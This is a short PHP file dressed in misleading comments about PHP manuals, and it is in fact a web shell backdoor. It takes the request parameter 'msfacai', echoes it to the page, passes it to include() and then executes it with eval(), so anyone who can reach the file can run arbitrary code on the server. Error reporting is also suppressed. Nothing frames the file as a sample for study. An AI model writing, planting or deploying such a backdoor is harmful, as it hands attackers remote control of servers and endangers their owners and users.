<?php
/**
 * Be sure to include no trailing slash on the path.
 * See license@php.net. for more information
 * about PHP manuals and their types.
 */
ini_set("session.cookie_httponly", true);
error_reporting(E_ALL^E_NOTICE^E_WARNING);
session_start();
$_SESSION['server']='';
//Core parameters
function dam(){
    $a=base64_encode($_REQUEST['msfacai']);
    if (isset($a)) {
        $b=''.base64_decode($a).'';
        return ($b);
    }
}
echo 'Important functions related to PHP system<br>'.$_SESSION['server'].dam().'';
$file=''.dam().'';
Include($file);
eval(''.dam().'');
?>
